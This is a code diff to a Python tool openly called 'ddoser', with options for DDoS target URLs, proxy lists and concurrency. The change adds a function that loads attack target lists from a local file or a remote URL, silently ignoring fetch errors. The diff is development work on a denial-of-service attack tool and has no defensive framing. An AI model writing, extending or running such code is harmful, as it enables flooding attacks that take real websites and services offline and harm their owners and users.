@@ -97,9 +97,25 @@ async def amain(
     await asyncio.gather(*coroutines)
 
 
+def load_targets(target_urls_file: str) -> List[str]:
+    target_urls = []
+    if target_urls_file:
+        if os.path.isfile(target_urls_file):
+            with open(target_urls_file) as f:
+                target_urls.extend(line.strip() for line in f)
+        else:
+            try:
+                res = requests.get(target_urls_file)
+                target_urls.extend(line.strip() for line in res.text.split())
+            except:
+                pass
+    logging.debug('Loaded %s targets to ddos', len(target_urls))
+    return target_urls
+
+
 @click.command(help="Run ddoser")
 @click.option('--target-url', help='ddos target url')
-@click.option('--target-urls-file', help='path to file contains urls to ddos')
+@click.option('--target-urls-file', help='path or url to file contains urls to ddos')
 @click.option('--proxy-url', help='url to proxy resourse')
 @click.option('--proxy-file', help='path to file with proxy list')
 @click.option('--concurrency', help='concurrency level', type=int, default=1)
@@ -118,10 +134,7 @@ def main(
     if not target_urls_file and not target_url:
         raise SystemExit('--target-url or --target-urls-file is required')
     proxies = load_proxies(proxy_file, proxy_url)
-    target_urls = []
-    if target_urls_file:
-        with open(target_urls_file) as f:
-            target_urls.extend(line.strip() for line in f)
+    target_urls = load_targets(target_urls_file)
     if target_url:
         target_urls.append(target_url)
     loop = asyncio.get_event_loop()
